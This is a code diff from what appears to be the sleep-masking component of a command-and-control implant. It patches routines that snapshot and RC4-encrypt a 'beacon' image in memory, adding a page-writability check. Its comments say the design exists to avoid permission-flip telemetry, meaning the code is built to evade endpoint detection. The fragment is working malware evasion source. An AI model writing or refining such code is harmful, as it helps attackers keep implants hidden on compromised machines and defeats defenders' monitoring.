@@ -197,6 +197,24 @@ typedef struct {
 	unsigned long len;
 } G3_BLOCK;
 
+/* A block can only be RC4'd in place if it is writable. The header page
+ * of a LoadLibrary'd module (extc2 payload inside the python controller)
+ * is mapped read-only after load - masking it was an instant access
+ * violation writing the image base (round 18). Skip non-writable pages
+ * instead of flipping protections: a flip is the Gen1 permission-flip
+ * telemetry this whole design exists to avoid. */
+static BOOL g3_page_writable(void * p)
+{
+	MEMORY_BASIC_INFORMATION mbi;
+
+	if (p == NULL)
+		return FALSE;
+	if (!VirtualQuery(p, &mbi, sizeof(mbi)))
+		return FALSE;
+	return (mbi.Protect & (PAGE_READWRITE | PAGE_WRITECOPY |
+	                       PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY)) != 0;
+}
+
 static int g3_snapshot_blocks(G3_BLOCK * out, int max)
 {
 	GARGLEP parms = *gparms;
@@ -255,15 +273,19 @@ static int g3_snapshot_blocks(G3_BLOCK * out, int max)
 			if (b > a) {
 				BOOL overlaps_text = (a < text_end && b > text_va);
 				if (!overlaps_text) {
-					out[n].ptr = (unsigned char *)parms.beacon_ptr + a;
-					out[n].len = b - a;
-					n++;
+					if (g3_page_writable((unsigned char *)parms.beacon_ptr + a)) {
+						out[n].ptr = (unsigned char *)parms.beacon_ptr + a;
+						out[n].len = b - a;
+						n++;
+					}
 				}
 				else if (a < text_va) {
-					/* keep the part below .text (header page) */
-					out[n].ptr = (unsigned char *)parms.beacon_ptr + a;
-					out[n].len = text_va - a;
-					n++;
+					/* keep the part below .text (header page) when writable */
+					if (g3_page_writable((unsigned char *)parms.beacon_ptr + a)) {
+						out[n].ptr = (unsigned char *)parms.beacon_ptr + a;
+						out[n].len = text_va - a;
+						n++;
+					}
 				}
 			}
 			sec += 2;
@@ -300,7 +322,7 @@ static int g3_snapshot_blocks(G3_BLOCK * out, int max)
 						he = img_lo; /* head straddle: keep below-image part */
 					if (hp < img_hi && he > img_hi)
 						hp = img_hi; /* tail straddle: keep above-image part */
-					if (hp < he) {
+					if (hp < he && g3_page_writable(hp)) {
 						out[n].ptr = hp;
 						out[n].len = (unsigned long)(he - hp);
 						n++;
